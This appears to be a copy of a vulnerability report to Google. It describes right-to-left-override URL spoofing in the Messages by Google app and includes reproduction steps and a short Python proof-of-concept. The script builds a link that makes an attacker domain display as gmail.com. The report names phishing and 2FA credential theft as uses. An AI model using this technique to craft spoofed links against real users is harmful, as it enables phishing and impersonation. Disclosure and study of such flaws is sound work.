# Google-sms-app-domain-spoofing
A copy of bug report to Google involving RTLO url spoofing within their default sms application.

Status:Unpatched

Summary: Messages by Google URL spoofing via RTLO

Product: Messages by Google

URL: play.google.com/store/apps/details?id=com.google.android.apps.messaging

Vulnerability type: Other

Details
Vulnerability Details:

Within Messages by Google an attacker is capable of rendering spoofed URLs via rtlo encoding. This allows a remote unauthenticated attacker to send authentic looking links that appear 
as any domain. With the use of subdomains an attacker is capable of faking document types such as pdf(fdp), txt(txt), jpg(gpj), png(gnp), etc.

Steps to reproduce:

Register “reverse” domain and build site. example: "nigol-resu.cloud/U/moc.liamg" = gmail.com/U/doulc.user-login

1. modify rtlo.py for usage with your domain
2. python3 rtlo.py  
4. Copy URL (on pc copy the string to txt file, move file to phone) or run in python environment on android device(copy string from Qpython environment)  
5. Paste entire string to Messages 
6. Send payload

POC script:

################################################################################### #!/usr/bin/env python

import sys

_SpoofUrl = 'gmail.com'

_RealUrl = 'nigol-resu.cloud'

_SubDir = 'U'

_RTLO = (u'\u202e')

_SpoofUrl = _SpoofUrl[::-1] _SubDir = _SubDir[::-1]

print(_SpoofUrl+'/'+_SubDir)

_NewUrl = _SpoofUrl+'/'+_SubDir

print(_NewUrl)

sys.stdout.write(' ' + _RTLO + (_RealUrl + '/' + _SubDir + '/' + _SpoofUrl) +'\n') 

#################################################################################################

Limitations:

Currently there is a 2̶8̶ character limit for spoofed URLs before formatting issues arise when pasting into messages. I believe with a little more effort the character limit can be raised.

UPDATE:URL length format issues are affected by screen size. Pasting and sending url when app is in "landscape" mode removes formatting issues and allows for longer urls(38?).

Attack scenario
Impact:

This simple exploit allows a remote attacker to impersonate high level domains.
Usage of said exploit for spam, information gathering(ip logging/browser fingerprinting), phishing top level domains, and single click exploits is highly likely. 
This exploit has a large attack surface, with 1 billion installs listed on the Google play store and the low technical effort needed to run, the probability of 
this being used in the wild is highly likely. Paired with an open-source 2fa phishing framework, this low complexity exploit becomes highly dangerous to the Google android user base.
